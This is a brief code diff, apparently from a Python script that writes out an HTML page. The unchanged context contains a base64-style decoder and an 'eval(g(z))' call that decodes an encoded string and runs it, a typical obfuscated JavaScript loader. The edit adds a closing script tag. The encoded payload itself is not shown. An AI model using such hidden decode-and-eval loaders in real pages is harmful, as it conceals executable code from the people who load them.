@@ -104,4 +104,4 @@ function g(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=
 eval(g(z));
 </script>
 """
-print '''<h5>pop pop</h5></body></html>'''
+print '''</script><h5>pop pop</h5></body></html>'''
